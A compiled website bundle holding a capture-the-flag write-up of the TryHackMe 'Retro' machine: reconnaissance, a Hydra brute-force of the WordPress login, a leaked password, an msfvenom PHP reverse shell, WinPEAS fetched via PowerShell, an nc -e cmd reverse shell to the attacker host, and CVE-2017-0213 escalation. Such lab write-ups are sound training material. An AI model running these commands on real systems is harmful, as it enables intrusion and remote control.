"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[7063],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return h}});var r=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var p=r.createContext({}),s=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=s(e.components);return r.createElement(p.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,p=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=s(n),h=o,m=u["".concat(p,".").concat(h)]||u[h]||d[h]||i;return n?r.createElement(m,a(a({ref:t},c),{},{components:n})):r.createElement(m,a({ref:t},c))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,a=new Array(i);a[0]=u;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l.mdxType="string"==typeof e?e:o,a[1]=l;for(var s=2;s<i;s++)a[s]=n[s];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},4453:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return p},metadata:function(){return s},toc:function(){return c},default:function(){return u}});var r=n(7462),o=n(3366),i=(n(7294),n(3905)),a=["components"],l={},p=void 0,s={unversionedId:"Cibersecurity/Writeups/Retro THM{}",id:"Cibersecurity/Writeups/Retro THM{}",title:"Retro THM{}",description:"Nmap",source:"@site/docs/Cibersecurity/Writeups/Retro THM{}.md",sourceDirName:"Cibersecurity/Writeups",slug:"/Cibersecurity/Writeups/Retro THM{}",permalink:"/docs/Cibersecurity/Writeups/Retro THM{}",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Writeups/Retro THM{}.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Relevant THM{}",permalink:"/docs/Cibersecurity/Writeups/Relevant THM{}"},next:{title:"SKYNET THM{}",permalink:"/docs/Cibersecurity/Writeups/SKYNET THM{}"}},c=[{value:"Nmap",id:"nmap",children:[],level:3},{value:"Gobuster",id:"gobuster",children:[],level:3},{value:"Wpscan",id:"wpscan",children:[],level:3},{value:"Hydra",id:"hydra",children:[],level:3},{value:"Webpage comments",id:"webpage-comments",children:[],level:3},{value:"Method 1. Using RDP",id:"method-1-using-rdp",children:[],level:3},{value:"Method 2 Wordpress to shell",id:"method-2-wordpress-to-shell",children:[],level:3},{value:"Winpeas",id:"winpeas",children:[],level:3},{value:"CVE-2019-1388 Exploit",id:"cve-2019-1388-exploit",children:[],level:3},{value:"CVE-2017-0213 Exploit",id:"cve-2017-0213-exploit",children:[],level:3}],d={toc:c};function u(e){var t=e.components,n=(0,o.Z)(e,a);return(0,i.kt)("wrapper",(0,r.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h3",{id:"nmap"},"Nmap"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=RetroWeb\n| Not valid before: 2022-04-06T16:54:22\n|_Not valid after:  2022-10-06T16:54:22\n|_ssl-date: 2022-04-07T17:05:49+00:00; 0s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: RETROWEB\n|   NetBIOS_Domain_Name: RETROWEB\n|   NetBIOS_Computer_Name: RETROWEB\n|   DNS_Domain_Name: RetroWeb\n|   DNS_Computer_Name: RetroWeb\n|   Product_Version: 10.0.14393\n|_  System_Time: 2022-04-07T17:05:49+00:00\n")),(0,i.kt)("h3",{id:"gobuster"},"Gobuster"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"http://10.10.228.64/retro/wp-login.php WORDPRESS LOGIN\nhttp://10.10.228.64/retro/wp-content/  WHITE\nhttp://10.10.228.64/retro/wp-includes/ FORBIDDEN\n")),(0,i.kt)("h3",{id:"wpscan"},"Wpscan"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'http://10.10.228.64/retro/index.php/wp-json/wp/v2/users/ USER "wade" \n')),(0,i.kt)("h3",{id:"hydra"},"Hydra"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"hydra -l wade -P /usr/share/wordlists/rockyou.txt.gz 10.10.228.64 http-form-post '/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for the username' -V"),"\n",(0,i.kt)("strong",{parentName:"p"},(0,i.kt)("em",{parentName:"strong"},"Does not work"))," "),(0,i.kt)("h3",{id:"webpage-comments"},"Webpage comments"),(0,i.kt)("p",null,"In the webpage's comments, we find this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"}," Leaving myself a note here just in case I forget how to spell it: parzival\n")),(0,i.kt)("p",null,"So, acknowledging that the user is wade, we try ",(0,i.kt)("inlineCode",{parentName:"p"},"wade:parzival"),"and can connect to the administration panel."),(0,i.kt)("h3",{id:"method-1-using-rdp"},"Method 1. Using RDP"),(0,i.kt)("p",null,"We can connect to the remote machine through RDP using the obtained credentials.\n",(0,i.kt)("inlineCode",{parentName:"p"},"xfreerdp  /p:'parzival' /u:'Wade' /v:10.10.228.64"),"\nNow we have the first flag."),(0,i.kt)("h3",{id:"method-2-wordpress-to-shell"},"Method 2 Wordpress to shell"),(0,i.kt)("p",null,"Like in Mr Robot and Internal, we can obtain a reverse shell uploading a .php.\nThis time the pentestmonkey does not work so we need to use one created with ",(0,i.kt)("inlineCode",{parentName:"p"},"msfvenom"),"."),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"We follow the first method of ",(0,i.kt)("a",{parentName:"li",href:"https://www.hacknos.com/wordpress-shell-upload/"},"https://www.hacknos.com/wordpress-shell-upload/")," , taking into account that the upload folder is the current year and month."),(0,i.kt)("li",{parentName:"ol"},"To create the payload, we can use this resource: ",(0,i.kt)("a",{parentName:"li",href:"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/"},"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/")," , choosing the php one.\n",(0,i.kt)("inlineCode",{parentName:"li"},"msfvenom -p php/reverse_php LHOST=10.11.62.63 LPORT=4444 -f raw > shell1.php"))),(0,i.kt)("h3",{id:"winpeas"},"Winpeas"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"We transfer the file ",(0,i.kt)("inlineCode",{parentName:"li"},"powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.62.63:8000/Winpeas.exe', 'C:\\Users\\Wade\\Winpeas.exe')\"")),(0,i.kt)("li",{parentName:"ol"},"We transfer ",(0,i.kt)("inlineCode",{parentName:"li"},"nc.exe")," using the same mehtod"),(0,i.kt)("li",{parentName:"ol"},"Start nc on the host ",(0,i.kt)("inlineCode",{parentName:"li"},"nc -lnvp 5555")),(0,i.kt)("li",{parentName:"ol"},"Connect to our host ",(0,i.kt)("inlineCode",{parentName:"li"},"nc64.exe 10.11.62.63 5555 -e cmd")),(0,i.kt)("li",{parentName:"ol"},"Execute Winpeas")),(0,i.kt)("p",null,"In case we have RDP, we transfer ",(0,i.kt)("inlineCode",{parentName:"p"},"Winpeas"),"and write this on cmd ",(0,i.kt)("inlineCode",{parentName:"p"},"REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1"),". After that, restart another ",(0,i.kt)("inlineCode",{parentName:"p"},"CMD")," and execute ",(0,i.kt)("inlineCode",{parentName:"p"},"Winpeas"),"."),(0,i.kt)("h3",{id:"cve-2019-1388-exploit"},"CVE-2019-1388 Exploit"),(0,i.kt)("p",null,"If we dig into the bin, we find a file named hhupd. Also there is a bookmark in the chrome browser refering to the ",(0,i.kt)("inlineCode",{parentName:"p"},"CVE-2019-1388"),"."),(0,i.kt)("h3",{id:"cve-2017-0213-exploit"},"CVE-2017-0213 Exploit"),(0,i.kt)("p",null,"This is another vulnerability much more easier to exploit, this is the one that we will follow.\nOn one hand, this vulnerability is not shown in the WinPeas scan, so, to discover it, we need to check the Version/Build:\n",(0,i.kt)("inlineCode",{parentName:"p"},"systeminfo")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Microsoft Windows Server 2016 Standard 10.0.14393 N/A Build 14393\n")),(0,i.kt)("p",null,"Finding on google, we discover the available exploit. ",(0,i.kt)("inlineCode",{parentName:"p"},"https://steflan-security.com/tryhackme-retro-walkthrough/"),"\nWe transfer the exploit to the windows machine and execute it. A new window appears and now we are ",(0,i.kt)("inlineCode",{parentName:"p"},"nt authority\\system")))}u.isMDXComponent=!0}}]);